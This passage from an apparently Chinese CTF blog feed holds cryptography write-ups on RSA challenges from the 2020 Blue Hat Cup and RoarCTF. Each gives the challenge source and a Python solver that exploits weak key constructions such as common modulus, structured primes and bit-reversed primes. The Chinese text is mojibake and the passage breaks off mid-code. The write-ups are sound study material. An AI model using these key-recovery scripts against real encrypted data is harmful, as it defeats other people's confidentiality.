$</p><p>å•å•è¿™ä¹ˆçœ‹ä¼šæœ‰ä¸ªå¤§é—®é¢˜ï¼Œå°±æ˜¯ï¼Œæ¨¡pçš„è¯ï¼Œ$2^{p}$ä¸æ˜¯ç­‰äº2ä¹ˆï¼Œ2-2=0ï¼Œé‚£ä¹ˆå°±æ˜¯0é™¤0äº†å‘€ã€‚</p><p>å®é™…ä»£ç æ“ä½œæ˜¯è¿™æ ·çš„ï¼šs = p - (pow(2, p, p*p)-2)//p</p><p>è¿™ä¹ˆå»ç†è§£ï¼Œå¼å­çš„æ„æ€å¯ä»¥çœ‹æˆå…ˆè¿ç®—(æ•´é™¤)ï¼Œæœ€åå–ä½™ï¼Œä½†æ˜¯å¦‚æœçœŸçš„å»è¿™ä¹ˆè¿ç®—ï¼Œç”±äºpå¤ªå¤§ï¼Œä»è€Œå¯¼è‡´$2^p$ä¹Ÿè¿‡äºå·¨å¤§äº†ï¼Œæ‰€ä»¥éœ€è¦åšä¸€äº›ä¼˜åŒ–ã€‚</p><p>æˆ‘ä»¬å¯ä»¥ç±»æ¯”åˆ°è¿›åˆ¶ä¸Šï¼Œæ¯”å¦‚åè¿›åˆ¶ï¼Œ(çœ‹æˆp=10)ï¼Œå¦‚æœæ¨¡100ç„¶åæ•´é™¤10ï¼Œé‚£ä¹ˆå…¶å®å°±æ˜¯ä¸ºäº†å–å¾—è¿™ä¸ªæ•°åä½ä¸Šçš„æ•°å­—ï¼Œè¿™ç­‰ä»·äºå…ˆæ•´é™¤10å†æ¨¡10ï¼Œ</p><p>å†å›åˆ°æˆ‘ä»¬è¿™é‡Œï¼Œå…ˆæ•´é™¤$p$ï¼Œå†æ¨¡æ‰$p$ï¼Œä¹Ÿå³ç­‰ä»·äºï¼Œå…ˆæ¨¡æ‰$p^2$ï¼Œå†æ•´é™¤$p$</p><p>æ‰€ä»¥æœ€ç»ˆé¢„æœŸè§£é¢˜ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> nextprime</span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">s = p - (pow(<span class="number">2</span>, p, p*p)<span class="number">-2</span>)//p</span><br><span class="line">q = nextprime(s)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="keyword">print</span> long_to_bytes(pow(c, d, n))</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜çš„éé¢„æœŸå¥½ä¿®å¤çš„ï¼Œç»™flagåšå¥½paddingï¼Œè®©flag&gt;&gt;på°±å¥½äº†ã€‚    </p><p>ï¼ˆä¸å¦‚è¿™ä¸ªæ¿å—æ•´æˆæ¯æ—¥ä¸€é¢˜å¥½äº†ï¼‰</p><p>â€”â€”è®°å½•äº2020.12.18</p><h3 id="2020è“å¸½æ¯-RSA"><a href="#2020è“å¸½æ¯-RSA" class="headerlink" title="2020è“å¸½æ¯-RSA"></a>2020è“å¸½æ¯-RSA</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG,HINT</span><br><span class="line"><span class="keyword">assert</span> len(HINT) &lt; len(FLAG)</span><br><span class="line"><span class="keyword">assert</span> len(FLAG) == <span class="number">38</span></span><br><span class="line"></span><br><span class="line">p1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q1 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n1 = p1*q1</span><br><span class="line">e1 = <span class="number">321959</span></span><br><span class="line">e2 = <span class="number">250261</span></span><br><span class="line">c1 = pow(bytes_to_long(HINT),e1,n1)</span><br><span class="line">c2 = pow(bytes_to_long(HINT),e2,n1)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'n1=&#123;&#125;'</span>.format(n1))</span><br><span class="line">print(<span class="string">'c1=&#123;&#125;'</span>.format(c1))</span><br><span class="line">print(<span class="string">'c2=&#123;&#125;'</span>.format(c2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">q2 = getPrime(<span class="number">2048</span>)</span><br><span class="line">n2 = p2*q2</span><br><span class="line">e3 = <span class="number">386321</span></span><br><span class="line">e4 = <span class="number">216437</span></span><br><span class="line"></span><br><span class="line">flag = bytes_to_long(FLAG)*bytes_to_long(HINT)</span><br><span class="line">c3 = pow(flag,e3,n2)</span><br><span class="line">c4 = pow(flag,e4,n2)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'n2=&#123;&#125;'</span>.format(n2))</span><br><span class="line">print(<span class="string">'c3=&#123;&#125;'</span>.format(c3))</span><br><span class="line">print(<span class="string">'c4=&#123;&#125;'</span>.format(c4))</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®æ¯”è¾ƒç®€å•ï¼Œä½†ä¹Ÿç¨å¾®æœ‰é‚£ä¹ˆä¸€ç‚¹å˜å‹åœ¨é‡Œé¢ã€‚</p><p>é¦–å…ˆæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ˜æ˜¾çš„å…±æ¨¡æ”»å‡»ï¼Œä½†æ˜¯è¿™é‡Œè¿˜æ˜¯éœ€è¦å¯¹å…±æ¨¡æ”»å‡»ä»¥åŠ$egcd$ç®—æ³•æœ‰ä¸€ç‚¹ç†è§£ï¼Œè‡³å°‘çŸ¥é“å…±æ¨¡æ”»å‡»çš„åŸç†ä»¥åŠ$egcd$ç®—æ³•çš„ä½œç”¨ã€‚</p><p>ç¬¬ä¸€æ­¥å¦‚æœè·‘æ­£å¸¸çš„å…±æ¨¡æ”»å‡»çš„è„šæœ¬çš„è¯ï¼Œç”±äº$gcd(e_1,e_2)=11$ï¼Œæ‰€ä»¥å¾—åˆ°çš„ä¼šæ˜¯$hint^{11} \pmod n$ï¼Œè¿™é‡Œ$hint^{11}$å°äº$n$ï¼Œæ‰€ä»¥ç›´æ¥å¼€11æ¬¡æ ¹å°±å¥½ï¼Œæ‹¿åˆ°$hint$</p><p>ç„¶åç¬¬äºŒæ­¥è¿™é‡Œä»–çš„$flag$æ˜¯$flag * hint$ï¼ŒåŒç¬¬ä¸€æ­¥ä¸€æ ·ï¼Œç”±äº$gcd(e_3, e_4)=13$ï¼Œè¿™é‡Œç”¨å…±æ¨¡æ”»å‡»å¾—åˆ°ä¼šæ˜¯$ï¼ˆflag * hint)^{13} \pmod n$ ï¼Œè¿™é‡Œç”±äºï¼ˆ$flag * hint) ^ {13} $å¤§äº$n$ï¼Œæ‰€ä»¥ç›´æ¥å¼€æ ¹å°±ä¸èƒ½å¾—åˆ°$flag * hint$ã€‚ä½†è¿™é‡Œå› ä¸ºæˆ‘ä»¬å·²ç»çŸ¥é“$hint$çš„å€¼äº†ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆæŠŠç»“æœä¹˜ä»¥$hint^{13}$çš„é€†ï¼Œè¿™æ ·å­å¾—åˆ°çš„å°±æ˜¯$flag^{13}$ï¼Œ æœ€åç»™å®ƒå¼€13æ¬¡æ ¹å°±èƒ½å¾—åˆ°$flag$äº†ã€‚</p><p>ï¼ˆæ°´äº†ä¸€é¢˜ï¼Œç•¥ç•¥~ï¼‰</p><p>â€”â€”è®°å½•äº2020.12.19</p>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å°å±‹ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 RoarCTF</title>
      <link href="/2020/12/10/2020RoarCTF/"/>
      <url>/2020/12/10/2020RoarCTF/</url>
      
        <content type="html"><![CDATA[<p>é¦–å‘äº<a href="https://www.anquanke.com/post/id/224973" target="_blank" rel="noopener">å®‰å…¨å®¢</a></p><p>è¿™æ¬¡æ¯”èµ›å¯†ç å­¦ä¸€å…±æœ‰å››é¢˜ï¼Œé™¤äº†EZRSAçœŸçš„æ¯”è¾ƒeasyï¼Œå…¶ä»–é¢˜è¿˜æ˜¯æœ‰ä¸€äº›åšå¤´ ï¼Œå°¤å…¶æœ€åä¸€é“ECDSAä¸ªäººæ„Ÿè§‰å‡ºçš„æŒºä¸é”™çš„ã€‚</p><p>å…ˆæ¥ä¸¤é“RSA</p><h2 id="EZRSA"><a href="#EZRSA" class="headerlink" title="EZRSA"></a>EZRSA</h2><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number <span class="built_in">import</span> *</span><br><span class="line">from gmpy2 <span class="built_in">import</span> *</span><br><span class="line">from secret <span class="built_in">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.startwith('flag&#123;')) <span class="literal">and</span> (flag.endwith('&#125;'))</span><br><span class="line"><span class="keyword">assert</span>(is_prime(beta) <span class="literal">and</span> len(bin(beta)[<span class="number">2</span>:]) == <span class="number">512</span>) </span><br><span class="line"><span class="keyword">assert</span>(len(bin(x)[<span class="number">2</span>:]) == len(bin(y)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># This is tip!!!</span></span><br><span class="line"><span class="keyword">assert</span>(<span class="attr">tip</span> == <span class="number">2</span>*x*y*beta + x + y)</span><br><span class="line"></span><br><span class="line"><span class="attr">p</span> = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line"><span class="attr">q</span> = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(is_prime(p) <span class="literal">and</span> is_prime(q))</span><br><span class="line"></span><br><span class="line"><span class="attr">n</span> = p*q</span><br><span class="line"><span class="attr">e</span> = <span class="number">65537</span></span><br><span class="line"><span class="attr">m</span> = bytes_to_long(flag)</span><br><span class="line"><span class="attr">enc</span> = powmod(m,e,n)   </span><br><span class="line"></span><br><span class="line"><span class="comment">#n = </span></span><br><span class="line"><span class="comment">#beta = </span></span><br><span class="line"><span class="comment">#e =</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®æä¾›äº†nï¼Œbetaï¼Œe</p><p>è¿™é“é¢˜æ„æ€å¾ˆæ˜ç¡®äº†ï¼Œn = p * q = 4xybeta ^ 2  + 2(x+y )beta + 1</p><p>å¾ˆè‡ªç„¶çš„èƒ½å¾—åˆ° tip = (n-1) //ï¼ˆ2 * betaï¼‰ </p><p>ç„¶åæˆ‘ä»¬ç»™tipæ¨¡ä¸Šbetaï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ° (x+y)%beta ï¼Œå¦‚æœæˆ‘ä»¬èƒ½å¤Ÿè·å¾—x + yï¼Œé‚£ä¹ˆæ˜¾ç„¶æˆ‘ä»¬ä¹Ÿèƒ½è·å¾—x * yï¼Œç„¶åè§£ä¸ªæ–¹ç¨‹å³å¯è·å¾—xå’Œyï¼Œç„¶åå°±èƒ½è·å¾—på’Œqï¼Œç»§è€Œè§£å¯†rsaå¾—åˆ°flag</p><p>é‚£ä¹ˆå¯¹äºè·å¾— x + yè¿™ä¸ªé—®é¢˜ï¼Œç”±äºbetaæ˜¯512ä½ï¼Œæˆ‘ä»¬å»çœ‹ä¸€ä¸‹nçš„ä½æ•°ä¸º 2068ï¼Œé‚£ä¹ˆå¹³å‡ä¸€ä¸‹pçš„ä½æ•°å°±æ˜¯1034äº†ï¼Œé‚£ä¹ˆxçš„ä½æ•°å¤§æ¦‚å°±æ˜¯1034 - 1 - 512 = 521ï¼Œx + y ä¼°è®¡ä¹Ÿå°±æ˜¯522ä½å·¦å³ï¼Œå’Œbetaä½æ•°å·®äº†10ä½å·¦å³ï¼Œå®Œå…¨æ˜¯å¯ä»¥æš´åŠ›çš„èŒƒå›´</p><p>å‚è€ƒè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">n =</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">enc = </span><br><span class="line">beta =</span><br><span class="line">tip = (n<span class="number">-1</span>)//(<span class="number">2</span>*beta)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    <span class="comment">#è·å–x + yçš„å€¼</span></span><br><span class="line">    x_add_y = tip % beta + beta*i</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#æ ¹æ®x + y è·å– x * y</span></span><br><span class="line">    x_mul_y = (tip - x_add_y)//(<span class="number">2</span>*beta)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> iroot(x_add_y**<span class="number">2</span> - <span class="number">4</span>*x_mul_y,<span class="number">2</span>)[<span class="number">1</span>]:</span><br><span class="line">            <span class="comment">#è§£æ–¹ç¨‹è·å–x å’Œ y</span></span><br><span class="line">            y = (x_add_y - iroot(x_add_y**<span class="number">2</span> - <span class="number">4</span>*x_mul_y,<span class="number">2</span>)[<span class="number">0</span>] )//<span class="number">2</span></span><br><span class="line">            x = x_add_y - y</span><br><span class="line">            p = <span class="number">2</span>*y*beta + <span class="number">1</span></span><br><span class="line">            q = <span class="number">2</span>*x*beta + <span class="number">1</span></span><br><span class="line">            phi = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">            d = inverse(e,int(phi))</span><br><span class="line">            <span class="keyword">print</span> long_to_bytes(pow(enc,d,n))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(flag.decode().startswith(<span class="string">'flag&#123;'</span>)) <span class="keyword">and</span> (flag.decode().endswith(<span class="string">'&#125;'</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse</span><span class="params">(x)</span>:</span></span><br><span class="line">y = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> x != <span class="number">0</span>:</span><br><span class="line">y = y*<span class="number">2</span> + x%<span class="number">2</span></span><br><span class="line">x = x // <span class="number">2</span></span><br><span class="line"><span class="keyword">return</span> y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">p = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">q = reverse(p)</span><br><span class="line"><span class="keyword">if</span> is_prime(q):</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">enc = powmod(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = </span></span><br><span class="line"><span class="comment">#enc =</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸€é“é¢˜å°±æ˜¯ä¸€ä¸ªæ­£å¸¸çš„RSAï¼Œä½†æ˜¯ç”Ÿæˆçš„på’Œqå†äºŒè¿›åˆ¶ä¸Šæ˜¯ç›¸åçš„ï¼Œå³è‹¥pæ˜¯11ï¼ˆ0b1011ï¼‰ï¼Œé‚£ä¹ˆqå°±æ˜¯13ï¼ˆ0b1101ï¼‰</p><p>å…¶å®æœ‰ç‚¹åƒä¸€ä¸ªç®—æ³•é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æµ‹è¯•å¾—çŸ¥ï¼Œå¦‚æœp * q = n ï¼Œé‚£ä¹ˆpçš„æœ€ä½ä½ ä¹˜ä»¥ qçš„æœ€ä½ä¸º ç­‰äº n çš„æœ€ä½ä¸ºï¼ŒåŸºäºè¿™ä¸ªäº‹å®ï¼Œæˆ‘ä»¬å¯ä»¥ä»æœ€ä½ä½ä¸€ä½ä¸€ä½çˆ†ç ´på’Œqï¼Œä½†æ˜¯å®é™…æ“ä½œåä¼šå‘ç°ï¼Œå¯èƒ½æ€§å¤ªå¤šï¼Œæ— æ³•å‰ªæï¼Œé‚£ä¹ˆå¤æ‚åº¦è¿‡é«˜çš„æƒ…å†µä¸‹è¿™ç§åšæ³•æ˜¯ä¸å¯å–çš„ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬åœ¨ä»¥ä¸Šçš„åŸºç¡€å†åŠ ä¸€ä¸ªåˆ¤æ–­ï¼š</p><p>ç”±äºæˆ‘ä»¬çŸ¥é“ pçš„é«˜ä½æ˜¯qçš„ä½ä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†påè¿‡æ¥ç„¶åæœ«å°¾è¡¥0ï¼Œè¡¥é½512ä½ï¼Œè¿™ä¸ªè‚¯å®šä¼šæ¯”çœŸçœŸçš„qå°ï¼ŒåŒç†å°†qåè¿‡æ¥æœ«å°¾è¡¥0ï¼Œè¿™æ ·å­æˆ‘ä»¬å¯ä»¥å¾—åˆ°p_min å’Œ q_minï¼Œé‚£ä¹ˆp_min * q_min è‚¯å®šæ˜¯å°äº nçš„ï¼Œå¦‚æœp_min * q_min &gt; nï¼Œé‚£ä¹ˆå°±å¯ä»¥èˆå¼ƒè¿™ä¸ªå¯èƒ½æ€§ã€‚</p><p>åŒç†æœ«å°¾è¡¥1å°±èƒ½å¾—åˆ°p_max å’Œ q_max ï¼Œå¦‚æœp_max * q_max &lt; n é‚£ä¹ˆè¿™ç§å¯èƒ½è¡Œä¹Ÿå¯ä»¥èˆå¼ƒ</p><p>å‚è€ƒä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">n = <span class="number">158985980192501034004997692253209315116841431063210516613522548452327355222295231366801286879768949611058043390843949610463241574886852164907094966008463721486557469253652940169060186477803255769516068561042756903927308078335838348784208212701919950712557406983012026654876481867000537670622886437968839524889</span></span><br><span class="line">ct = <span class="number">103728452309804750381455306214814700768557462686461157761076359181984554990431665209165298725569861567865645228742739676539208228770740802323555281253638825837621845841771677911598039696705908004858472132222470347720085501572979109563593281375095145984000628623881592799662103680478967594601571867412886606745</span></span><br><span class="line"></span><br><span class="line">max_idx = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">pq_list = [(<span class="number">1</span>,<span class="number">1</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">512</span>):</span><br><span class="line">    mod = <span class="number">2</span> ** (idx + <span class="number">1</span>)</span><br><span class="line">    new_pq_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> pq_list:</span><br><span class="line">        <span class="keyword">for</span> i, j <span class="keyword">in</span> product(range(<span class="number">2</span>), repeat=<span class="number">2</span>):</span><br><span class="line">            np = i * <span class="number">2</span> ** idx + p</span><br><span class="line">            nq = j * <span class="number">2</span> ** idx + q</span><br><span class="line"></span><br><span class="line">            <span class="comment">#judge1</span></span><br><span class="line">            <span class="keyword">if</span> (np * nq) % mod != n % mod:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line"><span class="comment">#judge2</span></span><br><span class="line">            rp_min = int(<span class="string">'&#123;:b&#125;'</span>.format(np)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'0'</span>), <span class="number">2</span>)</span><br><span class="line">            rq_min = int(<span class="string">'&#123;:b&#125;'</span>.format(nq)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'0'</span>), <span class="number">2</span>)</span><br><span class="line">            rp_max = int(<span class="string">'&#123;:b&#125;'</span>.format(np)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'1'</span>), <span class="number">2</span>)</span><br><span class="line">            rq_max = int(<span class="string">'&#123;:b&#125;'</span>.format(nq)[::<span class="number">-1</span>].ljust(<span class="number">512</span>, <span class="string">'1'</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> n &lt; rp_min * rq_min <span class="keyword">or</span> rp_max * rq_max &lt; n:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">                </span><br><span class="line"><span class="comment">#å¯èƒ½æ€§é›†åˆ</span></span><br><span class="line">            new_pq_list.append((np, nq))</span><br><span class="line">            </span><br><span class="line">    print(len(new_pq_list))</span><br><span class="line">    print(idx)</span><br><span class="line">    </span><br><span class="line">    pq_list = new_pq_list</span><br></pre></td></tr></table></figure><p>è¿è¡Œä»£ç å¤§æ¦‚è¦ä¸ªåå¤šåˆ†é’Ÿã€‚ç„¶åå¯èƒ½æ€§é›†åˆèƒ½è¾¾åˆ°å¿«äºŒåä¸‡ï¼Œæˆ‘ä»¬éå†è¿™ä¸ªé›†åˆï¼Œæ‰¾åˆ°å…¶ä¸­çš„ä¸¤ä¸ª512ä½ç´ æ•°å³ä¸ºpå’Œqï¼Œè¿›è€ŒRSAè§£å¯†å³å¯ã€‚</p><p>ç„¶åæ˜¯ä¸¤ä¸ªéœ€è¦äº¤äº’çš„é¢˜ç›®ï¼Œç»™çš„æ˜¯Crypto_Systemï¼Œä¸€ä¸ªç»™äº†æºç ï¼Œ ä¸€ä¸ªæ²¡ç»™ï¼Œä½†ä¸¤é“é¢˜æ ¸å¿ƒéƒ½æ˜¯æ„é€ ä¸€ä¸ªç­‰å¼ç„¶åè§£æ–¹ç¨‹ã€‚å…ˆæ¥çœ‹çœ‹è¿™ä¸ªç»™äº†æºç çš„ã€‚</p><h2 id="Crypto-System"><a href="#Crypto-System" class="headerlink" title="Crypto_System"></a>Crypto_System</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># These three are constants</span></span><br><span class="line">p = <span class="number">12039102490128509125925019010000012423515617235219127649182470182570195018265927223</span></span><br><span class="line">g = <span class="number">10729072579307052184848302322451332192456229619044181105063011741516558110216720725</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># random generation</span></span><br><span class="line">m1 = <span class="string">"test1"</span></span><br><span class="line">m2 = <span class="string">"test2"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Initialization</span></span><br><span class="line">r1, s1 = sign(m1)</span><br><span class="line"><span class="comment"># r1 will be provided to player</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">int2str</span><span class="params">(data, mode=<span class="string">"big"</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> mode == <span class="string">"little"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line">    <span class="keyword">elif</span> mode == <span class="string">"big"</span>:</span><br><span class="line">        <span class="keyword">return</span> sum([ord(data[::<span class="number">-1</span>][_]) * <span class="number">2</span> ** (<span class="number">8</span> * _) <span class="keyword">for</span> _ <span class="keyword">in</span> range(len(data))])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_parameter</span><span class="params">(m)</span>:</span></span><br><span class="line">    x = int2str(m, <span class="string">'little'</span>)</span><br><span class="line">    y = powmod(g, x, p)</span><br><span class="line">    a = bytes_to_long(hashlib.sha256(long_to_bytes(y).rjust(<span class="number">128</span>, <span class="string">"\0"</span>)).digest())</span><br><span class="line">    b = powmod(a, a, p - <span class="number">1</span>)</span><br><span class="line">    h = powmod(g, b, p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> y, h, b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(m)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    r = getStrongPrime(<span class="number">512</span>)</span><br><span class="line">    s = (y * powmod(h, r, p)) % p </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> str(r),str(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(m, r, s)</span>:</span></span><br><span class="line">    y, h, b = get_parameter(m)</span><br><span class="line">    <span class="keyword">if</span> s == ((y * powmod(h, r, p)) % p):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span 